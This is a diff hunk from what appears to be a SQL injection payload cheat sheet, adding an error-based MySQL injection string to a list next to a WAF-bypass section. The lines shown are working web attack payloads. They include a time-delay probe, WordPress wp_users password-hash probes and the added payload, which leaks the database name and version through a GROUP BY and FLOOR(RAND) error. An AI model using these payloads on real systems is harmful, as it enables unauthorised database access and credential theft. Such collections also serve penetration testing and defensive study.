@@ -32,6 +32,7 @@ WAITFOR DELAY '0:0:5'
 {`foo`/*bar*/(select+1)\}'
 {`foo`/*bar*/(select%2b2)}
 {`foo`/*bar*/(select+1+from+wp_users+where+user_pass+rlike+"(^)[$].*"+limit+1)}
+SELECT * FROM(SELECT COUNT(*),CONCAT(database(),'--',(SELECT (ELT(1=1,version()))),'--','_Y000!_',FLOOR(RAND(1)*1))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x) a
 ```
 ## Akami WAF Bypass
 ```sql
